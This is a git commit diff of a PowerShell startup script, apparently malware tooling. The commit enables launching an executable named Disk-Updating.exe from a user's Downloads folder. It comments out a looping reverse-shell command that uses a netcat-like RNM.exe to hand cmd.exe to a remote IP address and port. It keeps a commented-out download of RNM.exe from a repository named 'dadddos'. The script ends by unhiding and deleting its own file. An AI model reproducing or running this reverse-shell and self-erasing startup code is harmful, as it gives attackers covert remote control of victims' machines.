4265b37c3d4d895303d5d4b9d1eb87ab9d5989d2
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-21 22:53:19 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,12 +1,12 @@
 taskkill /F /IM Disk-Updating.exe
 #taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
-#C:\Users\angel\Downloads\Disk-Updating.exe
+C:\Users\angel\Downloads\Disk-Updating.exe
 #Stop-ScheduledTask -TaskName zed
 #Start-ScheduledTask -TaskName zed
 #taskkill /F /IM RNM.exe
 #Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
-while ($True) {C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe;Start-Sleep 7}
+#while ($True) {C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe;Start-Sleep 7}
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
 
